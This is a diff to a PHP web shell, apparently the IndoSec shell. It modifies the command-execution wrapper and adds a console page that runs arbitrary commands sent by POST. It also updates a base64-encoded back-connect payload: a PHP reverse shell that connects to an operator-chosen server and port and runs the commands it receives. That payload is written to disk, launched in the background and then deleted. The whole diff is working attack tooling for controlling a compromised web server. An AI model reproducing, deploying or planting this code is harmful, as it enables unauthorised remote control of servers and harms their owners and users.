@@ -132,7 +132,8 @@ function exe($cmd)
     {
 		@ob_start();
 		@system($cmd);
-		$buff = @ob_end_clean();
+        $buff = @ob_get_contents();
+        @ob_end_clean();
 	} 
     elseif(function_exists('exec'))
     {
@@ -143,7 +144,8 @@ function exe($cmd)
     {
 		@ob_start();
 		@passthru($cmd);
-		$buff = @ob_end_clean();
+        $buff = @ob_get_contents();
+		@ob_end_clean();
 	} 
     elseif(function_exists('shell_exec'))
     {
@@ -828,14 +830,14 @@ function dashboard() {
 }
 
 function network() {
-	pages("network", ["Tools","Network"]);
+	pages("network", ["Tools","Network"]); 
 
 	$server 	= $_POST["server"];
 	$port 		= $_POST["port"];
 	$content 	= "";
 	$nameFile 	= "";
 	$exe 		= "";
-	// $output		= "";
+	$output		= "";
 
 	if($_POST["bpl"])
 	{
@@ -860,7 +862,7 @@ function network() {
 
 	if($_POST["backconnect"] == "php")
 	{
-		$content = base64_decode("PD9waHAKCmVycm9yX3JlcG9ydGluZygwKTsKCiRpcCA9ICRhcmd2WzFdOwokcG9ydCA9ICRhcmd2WzJdOwoKJGhlYWRlciA9ICIKPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cbgouLjo6IEJhY2tDb25uZWN0IFBIUCBCeSBJbmRvU2VjIC4uOjpcbgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuCiI7CgpmdW5jdGlvbiBleGUoJGNtZCkKewoJJGJ1ZmYgPSAnJzsKCglpZihmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKQogICAgewoJCUBvYl9zdGFydCgpOwoJCUBzeXN0ZW0oJGNtZCk7CiAgICAgICAgJGJ1ZmYgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7CiAgICAgICAgQG9iX2VuZF9jbGVhbigpOwoJfSAKICAgIGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSkKICAgIHsKCQlAZXhlYygkY21kLCRyZXN1bHRzKTsKCQkkYnVmZiA9IEBqb2luKCJcbiIsJHJlc3VsdHMpOwoJfSAKICAgIGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1JykpCiAgICB7CgkJQG9iX3N0YXJ0KCk7CgkJQHBhc3N0aHJ1KCRjbWQpOwogICAgICAgICRidWZmID0gQG9iX2dldF9jb250ZW50cygpOwoJCUBvYl9lbmRfY2xlYW4oKTsKCX0gCiAgICBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpCiAgICB7CgkJJGJ1ZmYgPSBAc2hlbGxfZXhlYygkY21kKTsKCX0KCXJldHVybiAkYnVmZjsKfQoKZnVuY3Rpb24gc2VuZFBhY2thZ2UoJHNvY2tldCwgJHBhY2thZ2UpCnsKICAgIEBmcHV0cygkc29ja2V0LCAkcGFja2FnZSk7Cn0KCiRzb2NrZXQgPSBmc29ja29wZW4oJGlwLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyKTsKCmlmKCRlcnJubyAhPT0gMCkgCnsKICAgIGVjaG8oIiRlcnJubzogJGVycnN0ciIpOwogICAgcmV0dXJuOyAgIAp9CgppZighJHNvY2tldCkgCnsKICAgIGVjaG8oIlVuZXhwZWN0ZWQgZXJyb3IgaGFzIG9jY3VyZWQsIGNvbm5lY3Rpb24gbWF5IGhhdmUgZmFpbGVkLiIpOwogICAgcmV0dXJuOwp9IAoKc2VuZFBhY2thZ2UoJHNvY2tldCwgJGhlYWRlcik7CgokbGVuICAgICAgICA9IDEwMjQ7Cgp3aGlsZSghZmVvZigkc29ja2V0KSl7CiAgICAkaXBTZXJ2ZXIgPSBnZXRIb3N0QnlOYW1lKGdldEhvc3ROYW1lKCkpOwogICAgJGN1cnJlbnREaXIgPSBnZXRjd2QoKTsKICAgICRpc1Jvb3QgPSAocG9zaXhfZ2V0dWlkKCkgPT0gMCkgPyAiIyIgOiAiJCI7CgogICAgJGNtZCA9ICLilIxbJGlwU2VydmVyQEluZG9TZWNdflskY3VycmVudERpcl1cbuKUlCRpc1Jvb3QgIjsKICAgIHNlbmRQYWNrYWdlKCRzb2NrZXQsICRjbWQpOwoKICAgICRjb21tYW5kID0gZmdldHMoJHNvY2tldCwgJGxlbik7CgogICAgc2VuZFBhY2thZ2UoJHNvY2tldCwgIlxuIi5leGUoJGNvbW1hbmQpLiJcblxuIik7Cn0KQGZjbG9zZSgkc29ja2V0KTs=");
+		$content = base64_decode("PD9waHAKCmVycm9yX3JlcG9ydGluZygwKTsKc2V0X3RpbWVfbGltaXQoMCk7CgokaXAgPSAkYXJndlsxXTsKJHBvcnQgPSAkYXJndlsyXTsKCiRoZWFkZXIgPSAiCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG4KLi46OiBCYWNrQ29ubmVjdCBQSFAgQnkgSW5kb1NlYyAuLjo6XG4KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cbgoiOwoKZnVuY3Rpb24gZXhlKCRjbWQpCnsKCSRidWZmID0gJyc7CgoJaWYoZnVuY3Rpb25fZXhpc3RzKCdzeXN0ZW0nKSkKICAgIHsKCQlAb2Jfc3RhcnQoKTsKCQlAc3lzdGVtKCRjbWQpOwogICAgICAgICRidWZmID0gQG9iX2dldF9jb250ZW50cygpOwogICAgICAgIEBvYl9lbmRfY2xlYW4oKTsKCX0gCiAgICBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpCiAgICB7CgkJQGV4ZWMoJGNtZCwkcmVzdWx0cyk7CgkJJGJ1ZmYgPSBAam9pbigiXG4iLCRyZXN1bHRzKTsKCX0gCiAgICBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKQogICAgewoJCUBvYl9zdGFydCgpOwoJCUBwYXNzdGhydSgkY21kKTsKICAgICAgICAkYnVmZiA9IEBvYl9nZXRfY29udGVudHMoKTsKCQlAb2JfZW5kX2NsZWFuKCk7Cgl9IAogICAgZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpKQogICAgewoJCSRidWZmID0gQHNoZWxsX2V4ZWMoJGNtZCk7Cgl9CglyZXR1cm4gJGJ1ZmY7Cn0KCmZ1bmN0aW9uIHNlbmRQYWNrYWdlKCRzb2NrZXQsICRwYWNrYWdlKQp7CiAgICBAZnB1dHMoJHNvY2tldCwgJHBhY2thZ2UpOwp9Cgokc29ja2V0ID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0cik7CgppZigkZXJybm8gIT09IDApIGRpZSgiJGVycm5vOiAkZXJyc3RyIik7IAppZighJHNvY2tldCkgZGllKCJVbmV4cGVjdGVkIGVycm9yIGhhcyBvY2N1cmVkLCBjb25uZWN0aW9uIG1heSBoYXZlIGZhaWxlZC4iKTsKCnNlbmRQYWNrYWdlKCRzb2NrZXQsICRoZWFkZXIpOwoKJGxlbiAgICAgICAgPSAxMDI0OwokaXBTZXJ2ZXIgICA9IGdldEhvc3RCeU5hbWUoZ2V0SG9zdE5hbWUoKSk7CiRpc1Jvb3QgICAgID0gKHBvc2l4X2dldHVpZCgpID09IDApID8gIiMiIDogIiQiOwokY21kICAgICAgICA9ICLilIxbJGlwU2VydmVyQEluZG9TZWNdflsiLmdldGN3ZCgpLiJdXG7ilJQkaXNSb290ICI7CgpzZW5kUGFja2FnZSgkc29ja2V0LCAkY21kKTsKCndoaWxlKCFmZW9mKCRzb2NrZXQpKXsKICAgICRjbWQgICAgICAgID0gIuKUjFskaXBTZXJ2ZXJASW5kb1NlY11+WyIuZ2V0Y3dkKCkuIl1cbuKUlCRpc1Jvb3QgIjsKICAgICRjb21tYW5kICAgID0gZmdldHMoJHNvY2tldCwgJGxlbik7CiAgICAkY29tbWFuZHMgICA9IHRyaW0oc3RydG9sb3dlcigkY29tbWFuZCkpOwoKICAgIGlmKAogICAgICAgICRjb21tYW5kcyA9PSAiZXhpdCIgfHwgCiAgICAgICAgJGNvbW1hbmRzID09ICJxdWl0IiB8fAogICAgICAgICRjb21tYW5kcyA9PSAicSIKICAgICkgYnJlYWs7CiAgICAKICAgIGlmKHByZWdfbWF0Y2goIi9jZFwgKFteXHNdKykvaSIsJGNvbW1hbmQsJHJyKSkgewoJICAgICRkZCA9ICRyclsxXTsKCSAgICBpZihpc19kaXIoJGRkKSkgY2hkaXIoJGRkKTsKCSAgICAkbyA9ICJcbiIuIuKUjFskaXBTZXJ2ZXJASW5kb1NlY11+WyIuZ2V0Y3dkKCkuIl1cbuKUlCRpc1Jvb3QgIjsKCX0gZWxzZSAkbyA9ICJcbiIuZXhlKCRjb21tYW5kKS4iXG5cbiRjbWQiOwoKICAgIHNlbmRQYWNrYWdlKCRzb2NrZXQsICRvKTsKfQpAZmNsb3NlKCRzb2NrZXQpOw==");
 		$nameFile = "bc.php";
 		$exe = "php bc.php $server $port 1>/dev/null 2>&1 &";
 	}
@@ -870,10 +872,23 @@ function network() {
 		fwrite($file,$content);
 		$out = exe($exe);
 		sleep(1);
-		// $output = "<pre class='text-light'>$out\n".exe("ps aux | grep $nameFile")."</pre>";
+		$output = "<pre class='text-light'>$out\n".exe("ps aux | grep $nameFile")."</pre>";
 		unlink($nameFile);
 	}
 
+
+}
+
+function console()
+{
+	if(isset($_POST["console"]) || isset($_POST["cheat"])) {
+		$command = (!$_POST["console"] == "") ? $_POST["console"] : $_POST["cheat"]." 2>&1";
+		$out = exe($command);
+
+		pages("console", ["Tools", "Console"], array("{{OUTPUT}}"), array($out));
+	} else {
+		pages("console", ["Tools", "Console"], array("{{OUTPUT}}"), array(""));
+	}
 }
 
 if(isset($_GET["page"]))
@@ -899,6 +914,7 @@ if(isset($_GET["page"]))
 	if($page == "mdelete") mdelete();
 
 	// Tools
+	if($page == "console") console();
 	if($page == "adminer") adminer();
 	if($page == "network") network();
 
